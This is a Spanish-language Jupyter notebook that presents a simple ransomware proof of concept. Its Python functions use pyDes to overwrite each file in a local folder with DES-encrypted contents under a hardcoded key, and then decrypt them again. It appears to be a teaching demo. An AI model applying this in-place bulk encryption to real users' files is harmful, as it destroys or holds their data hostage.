## Una POC de un Ransomware usando DES
En esta POC veremos cómo puede encriptarse y desenriptarse rápidamente una carpeta con archivos usando el cifrador simétrico DES.
### Inicialización
Imports y funciones:

```python
# Para instalar pydes, descomente y ejecute la siguiente línea:
# %pip install pyDes
```

```python
# Imports
import os
import sys
from pyDes import des

carpeta_de_archivos = "archivos"

# Funciones:
def encriptaArchivo(user_pass, archivo):
    '''
    @funcionamiento: Encripta un archivo en el mismo directorio.
    @argumentos: la clave de encriptacion, el nombre del fichero
    @return: devuelve True
    '''
    #    abro el archivo lo copio en memoria y lo cierro
    f = open(archivo, 'rb+')
    d = f.read()
    f.close()
    #    convierto la clave string en objeto clave
    k = des(user_pass)
    #    encripta el archivo-objeto en memoria con el objeto clave y lo graba con el mismo nombre
    d = k.encrypt(d, ' ')
    f = open(archivo, 'wb+')
    f.write(d)
    f.close()
    return True

def desencriptaArchivo(user_pass, archivo):
    '''
    @funcionamiento: Desencripta un archivo en el mismo directorio.
    @argumentos: la clave de encriptacion, el nombre del fichero
    @return: devuelve True
    '''
    #    abro el archivo lo copio en memoria y lo cierro
    f = open(archivo, 'rb+')
    d = f.read()
    f.close()
    #    convierto la clave string en objeto clave
    k = des(user_pass)
    #    desencripto el archivo-objeto en memoria con el objeto clave y lo grabo con el mismo nombre
    d = k.decrypt(d, ' ')
    f = open(archivo, 'wb+')
    f.write(d)
    f.close()
    return True

def mostrarContenidoArchivo(archivoTexto):
    # Construimos la ruta absoluta
    ruta_archivo = os.path.join(os.getcwd(), "archivos", archivoTexto)
    
    try:
        # Todo lo que depende del éxito de la apertura va dentro del try
        with open(ruta_archivo, 'r', encoding='utf-8') as archivo:
            contenido = archivo.read()
        
        # Imprimimos los resultados (dentro del try)
        print(f"--- Contenido de {archivoTexto} ---")
        print("")
        print(contenido)
        print("-" * (20 + len(archivoTexto)))

    except FileNotFoundError:
        print(f"Error: El archivo no se encontró en: {ruta_archivo}")
    except Exception as e:
        print(f"Ocurrió un error inesperado: {e}")

def listarRutasArchivosParaEncriptar():
    # Definimos la base de la carpeta
    carpeta_objetivo = "archivos"
    directorio_base = os.path.join(os.getcwd(), carpeta_objetivo)
    
    try:
        if not os.path.exists(directorio_base):
            print(f"Error: No se encuentra la ruta {directorio_base}")
            return []

        # Obtenemos la lista de archivos
        nombres_archivos = [f for f in os.listdir(directorio_base) if os.path.isfile(os.path.join(directorio_base, f))]
        
        if not nombres_archivos:
            print(f"No hay archivos en {directorio_base}")
            return []

        print(f"--- Listado de rutas completas para encriptación ---")
        
        rutas_completas = []
        for nombre in nombres_archivos:
            # Construimos la ruta: os.getcwd() + carpeta + nombre del archivo
            ruta_completa = os.path.join(directorio_base, nombre)
            rutas_completas.append(ruta_completa)
            print(ruta_completa)
            
        print("-" * 60)
        return rutas_completas

    except Exception as e:
        print(f"Error al procesar el listado: {e}")
        return []
```

### Mostrar un archivo de la carpeta antes de encriptar
Puede elegir cualquier archivo de texto dentro de la carpeta "archivos"

```python
# Definir la ruta del archivo
archivoTexto="2prueba10.txt"
mostrarContenidoArchivo(archivoTexto)
```

### 1. Encriptar un Archivo específico
#### 1.a. Encripta con DES un archivo.

```python
clave='mi_clave'
# Encriptar un archivo 
ruta_archivo = os.path.join(os.getcwd(), "archivos", archivoTexto)
print(f"Encriptando el archivo {ruta_archivo} con la clave '{clave}'...")
encriptaArchivo(clave, ruta_archivo)
```

#### Mostrar el contenido del archivo encriptado

```python
mostrarContenidoArchivo(archivoTexto)
```

### 1.b. Desencripta el archivo con DES

```python
desencriptaArchivo(clave, ruta_archivo)
```

#### Mostrar contenido del archivo Desencriptado

```python
mostrarContenidoArchivo(archivoTexto)
print("")
```

```python
print("Proceso de encriptación y desencriptación completado.")
```

### 2. Encriptar y Desencriptar el contenido de una carpeta
#### 2.1. Encriptar todos los archivos

```python
# Listar archivos
lista_de_archivos = listarRutasArchivosParaEncriptar()
```

```python
# Encriptaremos todos los archivos listados:
for ruta in lista_de_archivos:
    print(f"Encriptando el archivo {ruta} con la clave '{clave}'...")
    encriptaArchivo(clave, ruta)
```

```python
# ver el contenido de un archivo en particular
mostrarContenidoArchivo(archivoTexto)
print("")
```

#### 2.2. Desencriptar todos los archivos

```python
for ruta in lista_de_archivos:
    print(f"Desencriptando el archivo {ruta} con la clave '{clave}'...")
    desencriptaArchivo(clave, ruta)
```

```python
# ver el contenido de un archivo en particular
mostrarContenidoArchivo(archivoTexto)
print("")
```
